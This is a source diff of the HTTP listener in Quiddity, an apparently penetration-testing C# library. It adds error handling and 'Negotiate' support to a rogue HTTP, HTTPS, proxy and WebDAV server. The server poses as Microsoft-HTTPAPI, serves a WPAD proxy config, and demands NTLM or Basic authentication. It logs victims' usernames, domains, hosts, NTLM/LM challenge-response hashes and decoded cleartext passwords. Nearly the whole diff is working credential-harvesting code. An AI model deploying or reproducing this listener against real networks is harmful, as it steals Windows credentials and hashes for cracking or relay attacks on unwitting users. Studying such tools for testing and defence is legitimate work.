@@ -1,7 +1,7 @@
 ﻿/*
  * BSD 3-Clause License
  *
- * Copyright (c) 2021, Kevin Robertson
+ * Copyright (c) 2022, Kevin Robertson
  * All rights reserved.
  *
  * Redistribution and use in source and binary forms, with or without
@@ -115,9 +115,13 @@ namespace Quiddity
                             }
                             while (!tcpAsync.IsCompleted);
 
-                            TcpClient tcpClient = tcpListener.EndAcceptTcpClient(tcpAsync);
-                            object[] parameters = { tcpClient, type };
-                            ThreadPool.QueueUserWorkItem(new WaitCallback(ReceiveClient), parameters);
+                            if (isRunning)
+                            {
+                                TcpClient tcpClient = tcpListener.EndAcceptTcpClient(tcpAsync);
+                                object[] parameters = { tcpClient, type, port };
+                                ThreadPool.QueueUserWorkItem(new WaitCallback(ReceiveClient), parameters);
+                            }
+
                         }
                         catch (Exception ex)
                         {
@@ -141,348 +145,367 @@ namespace Quiddity
             object[] parameterArray = parameters as object[];
             TcpClient tcpClient = (TcpClient)parameterArray[0];
             string type = (string)parameterArray[1];
-            string[] supportedMethods = { "GET", "HEAD", "OPTIONS", "CONNECT", "POST", "PROPFIND" };
-            string sourceIP = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Address.ToString();
-            string sourcePort = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Port.ToString();
-            string listenerPort = ((IPEndPoint)(tcpClient.Client.LocalEndPoint)).Port.ToString();
-            string session = sourceIP + ":" + sourcePort;
-            string ntlmChallenge = "";
-            int ntlmStage = 0;
-            bool proxyIgnoreMatch = false;
-            bool wpadAuthIgnoreMatch = false;
-            NetworkStream tcpStream = null;
-            NetworkStream httpStream = null;
-            SslStream httpsStream = null;
-            X509Certificate2 certificate = null;
-            bool isClientClose = false;
+            int port = (int)parameterArray[2];
 
-            if (type.Equals("HTTPS"))
+            try
             {
-                byte[] certificateData = Convert.FromBase64String(Cert);
-                certificate = new X509Certificate2(certificateData, CertPassword, X509KeyStorageFlags.MachineKeySet);
-                tcpStream = tcpClient.GetStream();
-                httpsStream = new SslStream(tcpStream, false);
-            }
-            else
-            {
-                httpStream = tcpClient.GetStream();
-            }
-
-            while (tcpClient.Connected && isRunning)
-            {
-                byte[] requestData = new byte[4096];
+                string[] supportedMethods = { "GET", "HEAD", "OPTIONS", "CONNECT", "POST", "PROPFIND" };
+                string sourceIP = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Address.ToString();
+                string sourcePort = ((IPEndPoint)(tcpClient.Client.RemoteEndPoint)).Port.ToString();
+                string listenerPort = ((IPEndPoint)(tcpClient.Client.LocalEndPoint)).Port.ToString();
+                string session = sourceIP + ":" + sourcePort;
+                string ntlmChallenge = "";
+                int ntlmStage = 0;
+                bool proxyIgnoreMatch = false;
+                bool wpadAuthIgnoreMatch = false;
+                NetworkStream tcpStream = null;
+                NetworkStream httpStream = null;
+                SslStream httpsStream = null;
+                X509Certificate2 certificate = null;
+                bool isClientClose = false;
 
                 if (type.Equals("HTTPS"))
                 {
-
-                    do
-                    {
-                        Thread.Sleep(100);
-                    }
-                    while (!tcpStream.DataAvailable && tcpClient.Connected);
-
+                    byte[] certificateData = Convert.FromBase64String(Cert);
+                    certificate = new X509Certificate2(certificateData, CertPassword, X509KeyStorageFlags.MachineKeySet);
+                    tcpStream = tcpClient.GetStream();
+                    httpsStream = new SslStream(tcpStream, false);
                 }
                 else
                 {
-
-                    do
-                    {
-                        Thread.Sleep(100); // todo check
-                    }
-                    while (!httpStream.DataAvailable && tcpClient.Connected);
-
+                    httpStream = tcpClient.GetStream();
                 }
 
-                if (String.Equals(type, "HTTPS"))
+                while (tcpClient.Connected && isRunning)
                 {
+                    byte[] requestData = new byte[16384];
 
-                    try
+                    if (type.Equals("HTTPS"))
                     {
 
-                        if (!httpsStream.IsAuthenticated)
+                        do
                         {
-                            httpsStream.AuthenticateAsServer(certificate, false, tls12, false);
+                            Thread.Sleep(100);
                         }
+                        while (!tcpStream.DataAvailable && tcpClient.Connected);
 
-                        while (tcpStream.DataAvailable)
+                    }
+                    else
+                    {
+
+                        do
                         {
-                            httpsStream.Read(requestData, 0, requestData.Length);
+                            Thread.Sleep(100); // todo check
                         }
-
-                    }
-                    catch (Exception ex)
-                    {
-
-                        if (!ex.Message.Contains("A call to SSPI failed, see inner exception.")) // todo check
-                        {
-                            Console.WriteLine(ex.Message);
-                        }
+                        while (!httpStream.DataAvailable && tcpClient.Connected);
 
                     }
 
-                }
-                else
-                {
-
-                    while (httpStream.DataAvailable)
-                    {
-                        httpStream.Read(requestData, 0, requestData.Length);
-                    }
-
-                }
-
-                HTTPRequest request = new HTTPRequest();
-
-                if (!Utilities.ArrayIsNullOrEmpty(requestData))
-                {
-                    request.ReadBytes(requestData, 0);
-                }
-
-                if (!string.IsNullOrEmpty(request.Method))
-                {
-                    OutputRequestMethod(type, listenerPort, sourceIP, sourcePort, request.URI, request.Method);
-                }
-
-                if (!string.IsNullOrEmpty(request.URI))
-                {
-                    OutputHostHeader(type, listenerPort, sourceIP, sourcePort, request.Host);
-                }
-
-                if (!string.IsNullOrEmpty(request.UserAgent))
-                {
-                    OutputUserAgent(type, listenerPort, sourceIP, sourcePort, request.UserAgent);
-                }
-
-                if (!string.IsNullOrEmpty(request.Method) && Array.Exists(supportedMethods, element => element == request.Method))
-                {
-
-                    HTTPResponse response = new HTTPResponse
-                    {
-                        Version = "HTTP/1.1",
-                        StatusCode = "401",
-                        ReasonPhrase = "Unauthorized",
-                        Connection = "close",
-                        Server = "Microsoft-HTTPAPI/2.0",
-                        Date = DateTime.Now.ToString("R"),
-                        ContentType = "text/html",
-                        ContentLength = "0"
-                    };
-
-                    if (!Utilities.ArrayIsNullOrEmpty(IgnoreAgents) && WPADAuth.Equals("NTLM"))
+                    if (String.Equals(type, "HTTPS"))
                     {
 
-                        foreach (string agent in IgnoreAgents)
+                        try
                         {
 
-                            if (request.UserAgent.ToUpper().Contains(agent.ToUpper()))
+                            if (!httpsStream.IsAuthenticated)
                             {
-                                wpadAuthIgnoreMatch = true;
+                                httpsStream.AuthenticateAsServer(certificate, false, tls12, false);
+                            }
+
+                            while (tcpStream.DataAvailable)
+                            {
+                                httpsStream.Read(requestData, 0, requestData.Length);
+                            }
+
+                        }
+                        catch (Exception ex)
+                        {
+
+                            if (!ex.Message.Contains("A call to SSPI failed, see inner exception.")) // todo check
+                            {
+                                Console.WriteLine(ex.Message);
                             }
 
                         }
 
-                        if (wpadAuthIgnoreMatch)
+                    }
+                    else
+                    {
+
+                        while (httpStream.DataAvailable)
                         {
-                            OutputIgnore(type, listenerPort, sourceIP, sourcePort, "switching wpad.dat auth to anonymous due to user agent match"); // todo make better
+                            httpStream.Read(requestData, 0, requestData.Length);
                         }
 
                     }
+                    
+                    HTTPRequest request = new HTTPRequest();
 
-                    if (type.Equals("Proxy"))
+                    if (!Utilities.ArrayIsNullOrEmpty(requestData))
                     {
-                        response.StatusCode = "407";
-                        response.ProxyAuthenticate = "NTLM";
-                        response.WWWAuthenticate = "";
-                        response.Connection = "close";
-                    }
-                    else if (EnabledWebDAV && request.Method.Equals("PROPFIND") && WebDAVAuth.StartsWith("NTLM"))
-                    {
-                        response.WWWAuthenticate = "NTLM";
-                    }
-                    else if (EnabledWebDAV && request.Method.Equals("PROPFIND") && WebDAVAuth.Equals("BASIC"))
-                    {
-                        response.WWWAuthenticate = string.Concat("Basic realm=", HTTPRealm);
-                    }
-                    else if (!string.Equals(request.URI, "/wpad.dat") && string.Equals(HTTPAuth, "ANONYMOUS") || string.Equals(request.URI, "/wpad.dat") && string.Equals(WPADAuth, "ANONYMOUS") || wpadAuthIgnoreMatch ||
-                        (EnabledWebDAV && request.Method.Equals("OPTIONS")))
-                    {
-                        response.StatusCode = "200";
-                        response.ReasonPhrase = "OK";
-                    }
-                    else if ((HTTPAuth.StartsWith("NTLM") && !string.Equals(request.URI, "/wpad.dat")) || (WPADAuth.StartsWith("NTLM") && string.Equals(request.URI, "/wpad.dat")))
-                    {
-                        response.WWWAuthenticate = "NTLM";
-                    }
-                    else if ((string.Equals(HTTPAuth, "BASIC") && !string.Equals(request.URI, "/wpad.dat")) || (string.Equals(WPADAuth, "BASIC") && string.Equals(request.URI, "/wpad.dat")))
-                    {
-                        response.WWWAuthenticate = string.Concat("Basic realm=", HTTPRealm);
+                        request.ReadBytes(requestData, 0);
                     }
 
-                    if ((!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("NTLM ")) || (!string.IsNullOrEmpty(request.ProxyAuthorization)) && request.ProxyAuthorization.ToUpper().StartsWith("NTLM "))
+                    if (!string.IsNullOrEmpty(request.Method))
                     {
-                        string authorization = request.Authorization;
+                        OutputRequestMethod(type, listenerPort, sourceIP, sourcePort, request.URI, request.Method);
+                    }
 
-                        if (!string.IsNullOrEmpty(request.ProxyAuthorization))
+                    if (!string.IsNullOrEmpty(request.URI))
+                    {
+                        OutputHostHeader(type, listenerPort, sourceIP, sourcePort, request.Host);
+                    }
+
+                    if (!string.IsNullOrEmpty(request.UserAgent))
+                    {
+                        OutputUserAgent(type, listenerPort, sourceIP, sourcePort, request.UserAgent);
+                    }
+
+                    if (!string.IsNullOrEmpty(request.Method) && Array.Exists(supportedMethods, element => element == request.Method))
+                    {
+
+                        HTTPResponse response = new HTTPResponse
                         {
-                            authorization = request.ProxyAuthorization;
-                        }
+                            Version = "HTTP/1.1",
+                            StatusCode = "401",
+                            ReasonPhrase = "Unauthorized",
+                            Connection = "close",
+                            Server = "Microsoft-HTTPAPI/2.0",
+                            Date = DateTime.Now.ToString("R"),
+                            ContentType = "text/html",
+                            ContentLength = "0"
+                        };
 
-                        NTLMNegotiate ntlm = new NTLMNegotiate();
-                        ntlm.ReadBytes(Convert.FromBase64String(authorization.Substring(5, authorization.Length - 5)), 0);
-
-                        if (ntlm.MessageType == 1)
+                        if (!Utilities.ArrayIsNullOrEmpty(IgnoreAgents) && WPADAuth.Equals("NTLM"))
                         {
-                            byte[] timestamp = BitConverter.GetBytes(DateTime.Now.ToFileTime());
-                            NTLMChallenge challenge = new NTLMChallenge(Challenge, NetbiosDomain, ComputerName, DNSDomain, ComputerName, DNSDomain);
-                            byte[] challengeData = challenge.GetBytes(ComputerName);
-                            ntlmChallenge = BitConverter.ToString(challenge.ServerChallenge).Replace("-", "");
-                            string sessionTimestamp = BitConverter.ToString(timestamp).Replace("-", "");
-                            httpSessionTable[sessionTimestamp] = ntlmChallenge;
-                            OutputChallenge(type, listenerPort, sourceIP, sourcePort, ntlmChallenge);
 
-                            if (String.Equals(type, "Proxy"))
-                            {
-                                response.StatusCode = "407";
-                                response.ProxyAuthenticate = "NTLM " + Convert.ToBase64String(challengeData);
-                            }
-                            else
-                            {
-                                response.WWWAuthenticate = "NTLM " + Convert.ToBase64String(challengeData);
-                            }
-
-                            response.Connection = "";
-                        }
-                        else if (ntlm.MessageType == 3)
-                        {
-                            response.StatusCode = "200";
-                            response.ReasonPhrase = "OK";
-                            ntlmStage = 3;
-                            isClientClose = true;
-                            NTLMResponse ntlmResponse = new NTLMResponse(Convert.FromBase64String(authorization.Substring(5, authorization.Length - 5)), false);
-                            string domain = Encoding.Unicode.GetString(ntlmResponse.DomainName);
-                            string user = Encoding.Unicode.GetString(ntlmResponse.UserName);
-                            string host = Encoding.Unicode.GetString(ntlmResponse.Workstation);
-                            string ntlmResponseHash = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-", "");
-                            string lmResponseHash = BitConverter.ToString(ntlmResponse.LmChallengeResponse).Replace("-", "");
-
-                            if (string.IsNullOrEmpty(ntlmChallenge)) // NTLMv2 workaround to track sessions over different ports without a cookie
+                            foreach (string agent in IgnoreAgents)
                             {
 
-                                try
+                                if (request.UserAgent.ToUpper().Contains(agent.ToUpper()))
                                 {
-                                    byte[] timestamp = new byte[8];
-                                    Buffer.BlockCopy(ntlmResponse.NtChallengeResponse, 24, timestamp, 0, 8);
-                                    string sessionTimestamp = BitConverter.ToString(timestamp).Replace("-", "");
-                                    ntlmChallenge = httpSessionTable[sessionTimestamp].ToString();
-                                }
-                                catch
-                                {
-                                    ntlmChallenge = "";
+                                    wpadAuthIgnoreMatch = true;
                                 }
 
                             }
 
-                            OutputNTLM(type, listenerPort, sourceIP, sourcePort, user, domain, host, ntlmChallenge, ntlmResponseHash, lmResponseHash);
-
-                            if (type.Equals("Proxy"))
+                            if (wpadAuthIgnoreMatch)
                             {
-
-                                if (!string.IsNullOrEmpty(HTTPResponse))
-                                {
-                                    response.CacheControl = "no-cache, no-store";
-                                }
-
+                                OutputIgnore(type, listenerPort, sourceIP, sourcePort, "switching wpad.dat auth to anonymous due to user agent match"); // todo make better
                             }
 
                         }
-
-                    }
-                    else if (!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("BASIC "))
-                    {
-                        response.StatusCode = "200";
-                        response.ReasonPhrase = "OK";
-                        string httpHeaderAuthorizationBase64 = request.Authorization.Substring(6, request.Authorization.Length - 6);
-                        string cleartextCredentials = Encoding.UTF8.GetString(Convert.FromBase64String(httpHeaderAuthorizationBase64));
-                        OutputCleartext(type, listenerPort, sourceIP, sourcePort, cleartextCredentials);
-                    }
-
-                    if (!string.IsNullOrEmpty(WPADResponse) && !proxyIgnoreMatch && string.Equals(request.URI, "/wpad.dat"))
-                    {
-                        response.ContentType = "application/x-ns-proxy-autoconfig";
-                        response.Message = Encoding.UTF8.GetBytes(WPADResponse);
-                    }
-                    else if (!string.IsNullOrEmpty(HTTPResponse))
-                    {
-                        response.Message = Encoding.UTF8.GetBytes(HTTPResponse);
-                    }
-
-                    if (EnabledWebDAV)
-                    {
-
-                        if (request.Method.Equals("OPTIONS"))
-                        {
-                            response.StatusCode = "200";
-                            response.ReasonPhrase = "OK";
-                            response.Allow = "OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK";
-                            response.Public = "OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK";
-                            response.DAV = "1,2,3";
-                            response.Author = "DAV";
-                        }
-                        else if (request.Method.Equals("PROPFIND"))
-                        {
-                            DateTime currentTime = DateTime.Now;
-                            response.Message = Encoding.UTF8.GetBytes("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\"http://www.w3.org/TR/html4/strict.dtd\">\r\n<HTML><HEAD><TITLE>Not Authorized</TITLE>\r\n<META HTTP-EQUIV=\"Content-Type\" Content=\"text/html; charset=us-ascii\"></HEAD>\r\n<BODY><h2>Not Authorized</h2>\r\n<hr><p>HTTP Error 401. The requested resource requires user authentication.</p>\r\n</BODY></HTML>\r\n");
-                            response.Connection = "";
-
-                            if (ntlmStage == 3 || (!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("BASIC ")) || HTTPAuth.Equals("ANONYMOUS"))
-                            {
-                                response.Connection = "close";
-
-                                if (!request.URI.Contains("."))
-                                {
-                                    response.ContentType = "text/xml";
-                                    response.Message = Encoding.UTF8.GetBytes("<?xml version=\"1.0\" encoding=\"utf-8\"?><D:multistatus xmlns:D=\"DAV:\"><D:response><D:href>http://" + sourceIP + request.URI + "</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>" + currentTime.ToString("R") + "</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag/><D:displayname>webdav</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength><D:iscollection>1</D:iscollection><D:creationdate>" + currentTime.ToString("yyyy-MM-ddThh:mm:ss.fffZ") + "</D:creationdate><D:resourcetype><D:collection/></D:resourcetype></D:prop></D:propstat></D:response></D:multistatus>");
-                                }
-                                else
-                                {
-                                    response.ContentType = "text/plain";
-                                }
-
-                            }
-
-                        }
-
-                    }
-
-                    byte[] buffer = response.GetBytes();
-
-                    if (type.Equals("HTTPS") && httpsStream.CanRead)
-                    {
-                        httpsStream.Write(buffer, 0, buffer.Length);
-                        httpsStream.Flush();
-                    }
-                    else if (httpStream.CanRead)
-                    {
-                        httpStream.Write(buffer, 0, buffer.Length);
-                        httpStream.Flush();
-                    }
-
-                    if (isClientClose)
-                    {
 
                         if (type.Equals("Proxy"))
                         {
-                            tcpClient.Client.Close();
+                            response.StatusCode = "407";
+                            response.ProxyAuthenticate = "NTLM";
+                            response.WWWAuthenticate = "";
+                            response.Connection = "close";
                         }
-                        else
+                        else if (EnabledWebDAV && request.Method.Equals("PROPFIND") && WebDAVAuth.StartsWith("NTLM"))
                         {
-                            tcpClient.Close();
+                            response.WWWAuthenticate = "NTLM";
+                        }
+                        else if (EnabledWebDAV && request.Method.Equals("PROPFIND") && WebDAVAuth.Equals("BASIC"))
+                        {
+                            response.WWWAuthenticate = string.Concat("Basic realm=", HTTPRealm);
+                        }
+                        else if (!string.Equals(request.URI, "/wpad.dat") && string.Equals(HTTPAuth, "ANONYMOUS") || string.Equals(request.URI, "/wpad.dat") && string.Equals(WPADAuth, "ANONYMOUS") || wpadAuthIgnoreMatch ||
+                            (EnabledWebDAV && request.Method.Equals("OPTIONS")))
+                        {
+                            response.StatusCode = "200";
+                            response.ReasonPhrase = "OK";
+                        }
+                        else if ((HTTPAuth.StartsWith("NTLM") && !string.Equals(request.URI, "/wpad.dat")) || (WPADAuth.StartsWith("NTLM") && string.Equals(request.URI, "/wpad.dat")))
+                        {
+                            response.WWWAuthenticate = "NTLM";
+                        }
+                        else if ((string.Equals(HTTPAuth, "BASIC") && !string.Equals(request.URI, "/wpad.dat")) || (string.Equals(WPADAuth, "BASIC") && string.Equals(request.URI, "/wpad.dat")))
+                        {
+                            response.WWWAuthenticate = string.Concat("Basic realm=", HTTPRealm);
+                        }
+
+                        if (!string.IsNullOrEmpty(request.Authorization) && (request.Authorization.ToUpper().StartsWith("NTLM ") || request.Authorization.ToUpper().StartsWith("NEGOTIATE ")) || (!string.IsNullOrEmpty(request.ProxyAuthorization) && request.ProxyAuthorization.ToUpper().StartsWith("NTLM ")))
+                        {
+                            string authorization = request.Authorization;
+ 
+                            if (!string.IsNullOrEmpty(request.ProxyAuthorization))
+                            {
+                                authorization = request.ProxyAuthorization;
+                            }
+
+                            NTLMNegotiate ntlm = new NTLMNegotiate();
+                            ntlm.ReadBytes(Convert.FromBase64String(authorization.Split(' ')[1]), 0);
+
+                            if (ntlm.MessageType == 1)
+                            {
+                                byte[] timestamp = BitConverter.GetBytes(DateTime.Now.ToFileTime());
+                                NTLMChallenge challenge = new NTLMChallenge(Challenge, NetbiosDomain, ComputerName, DNSDomain, ComputerName, DNSDomain, timestamp);
+                                byte[] challengeData = challenge.GetBytes(ComputerName);
+                                ntlmChallenge = BitConverter.ToString(challenge.ServerChallenge).Replace("-", "");
+                                string sessionTimestamp = BitConverter.ToString(timestamp).Replace("-", "");
+                                httpSessionTable[sessionTimestamp] = ntlmChallenge;
+                                OutputChallenge(type, listenerPort, sourceIP, sourcePort, ntlmChallenge);
+
+                                if (String.Equals(type, "Proxy"))
+                                {
+                                    response.StatusCode = "407";
+                                    response.ProxyAuthenticate = "NTLM " + Convert.ToBase64String(challengeData);
+                                }
+                                else
+                                {
+
+                                    if (request.Authorization.ToUpper().StartsWith("NEGOTIATE "))
+                                    {
+                                        response.WWWAuthenticate = "Negotiate " + Convert.ToBase64String(challengeData);
+                                    }
+                                    else
+                                    {
+                                        response.WWWAuthenticate = "NTLM " + Convert.ToBase64String(challengeData);
+                                    }
+
+                                }
+
+                                response.Connection = "";
+                            }
+                            else if (ntlm.MessageType == 3)
+                            {
+                                response.StatusCode = "200";
+                                response.ReasonPhrase = "OK";
+                                ntlmStage = 3;
+                                isClientClose = true;
+                                NTLMResponse ntlmResponse = new NTLMResponse(Convert.FromBase64String(authorization.Split(' ')[1]), false);
+                                string domain = Encoding.Unicode.GetString(ntlmResponse.DomainName);
+                                string user = Encoding.Unicode.GetString(ntlmResponse.UserName);
+                                string host = Encoding.Unicode.GetString(ntlmResponse.Workstation);
+                                string ntlmResponseHash = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-", "");
+                                string lmResponseHash = BitConverter.ToString(ntlmResponse.LmChallengeResponse).Replace("-", "");
+
+                                if (string.IsNullOrEmpty(ntlmChallenge)) // NTLMv2 workaround to track sessions over different ports without a cookie
+                                {
+
+                                    try
+                                    {
+                                        byte[] timestamp = new byte[8];                                 
+                                        Buffer.BlockCopy(ntlmResponse.NtChallengeResponse, 24, timestamp, 0, 8);
+                                        string sessionTimestamp = BitConverter.ToString(timestamp).Replace("-", "");
+                                        ntlmChallenge = httpSessionTable[sessionTimestamp].ToString();
+                                    }
+                                    catch
+                                    {
+                                        ntlmChallenge = "";
+                                    }
+
+                                }
+
+                                OutputNTLM(type, listenerPort, sourceIP, sourcePort, user, domain, host, ntlmChallenge, ntlmResponseHash, lmResponseHash);
+
+                                if (type.Equals("Proxy"))
+                                {
+
+                                    if (!string.IsNullOrEmpty(HTTPResponse))
+                                    {
+                                        response.CacheControl = "no-cache, no-store";
+                                    }
+
+                                }
+
+                            }
+
+                        }
+                        else if (!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("BASIC "))
+                        {
+                            response.StatusCode = "200";
+                            response.ReasonPhrase = "OK";
+                            string httpHeaderAuthorizationBase64 = request.Authorization.Substring(6, request.Authorization.Length - 6);
+                            string cleartextCredentials = Encoding.UTF8.GetString(Convert.FromBase64String(httpHeaderAuthorizationBase64));
+                            OutputCleartext(type, listenerPort, sourceIP, sourcePort, cleartextCredentials);
+                        }
+
+                        if (!string.IsNullOrEmpty(WPADResponse) && !proxyIgnoreMatch && string.Equals(request.URI, "/wpad.dat"))
+                        {
+                            response.ContentType = "application/x-ns-proxy-autoconfig";
+                            response.Message = Encoding.UTF8.GetBytes(WPADResponse);
+                        }
+                        else if (!string.IsNullOrEmpty(HTTPResponse))
+                        {
+                            response.Message = Encoding.UTF8.GetBytes(HTTPResponse);
+                        }
+
+                        if (EnabledWebDAV)
+                        {
+
+                            if (request.Method.Equals("OPTIONS"))
+                            {
+                                response.StatusCode = "200";
+                                response.ReasonPhrase = "OK";
+                                response.Allow = "OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK";
+                                response.Public = "OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK";
+                                response.DAV = "1,2,3";
+                                response.Author = "DAV";
+                            }
+                            else if (request.Method.Equals("PROPFIND"))
+                            {
+                                DateTime currentTime = DateTime.Now;
+                                response.Message = Encoding.UTF8.GetBytes("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\"http://www.w3.org/TR/html4/strict.dtd\">\r\n<HTML><HEAD><TITLE>Not Authorized</TITLE>\r\n<META HTTP-EQUIV=\"Content-Type\" Content=\"text/html; charset=us-ascii\"></HEAD>\r\n<BODY><h2>Not Authorized</h2>\r\n<hr><p>HTTP Error 401. The requested resource requires user authentication.</p>\r\n</BODY></HTML>\r\n");
+                                response.Connection = "";
+
+                                if (ntlmStage == 3 || (!string.IsNullOrEmpty(request.Authorization) && request.Authorization.ToUpper().StartsWith("BASIC ")) || HTTPAuth.Equals("ANONYMOUS"))
+                                {
+                                    response.Connection = "close";
+
+                                    if (!request.URI.Contains("."))
+                                    {
+                                        response.ContentType = "text/xml";
+                                        response.Message = Encoding.UTF8.GetBytes("<?xml version=\"1.0\" encoding=\"utf-8\"?><D:multistatus xmlns:D=\"DAV:\"><D:response><D:href>http://" + sourceIP + request.URI + "</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>" + currentTime.ToString("R") + "</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag/><D:displayname>webdav</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength><D:iscollection>1</D:iscollection><D:creationdate>" + currentTime.ToString("yyyy-MM-ddThh:mm:ss.fffZ") + "</D:creationdate><D:resourcetype><D:collection/></D:resourcetype></D:prop></D:propstat></D:response></D:multistatus>");
+                                    }
+                                    else
+                                    {
+                                        response.ContentType = "text/plain";
+                                    }
+
+                                }
+
+                            }
+
+                        }
+
+                        byte[] buffer = response.GetBytes();
+
+                        if (type.Equals("HTTPS") && httpsStream.CanRead)
+                        {
+                            httpsStream.Write(buffer, 0, buffer.Length);
+                            httpsStream.Flush();
+                        }
+                        else if (httpStream.CanRead)
+                        {
+                            httpStream.Write(buffer, 0, buffer.Length);
+                            httpStream.Flush();
+                        }
+
+                        if (isClientClose)
+                        {
+
+                            if (type.Equals("Proxy"))
+                            {
+                                tcpClient.Client.Close();
+                            }
+                            else
+                            {
+                                tcpClient.Close();
+                            }
+
                         }
 
                     }
 
                 }
 
+            }
+            catch (Exception ex)
+            {
+                OutputError(ex, type, port);
             }
 
         }
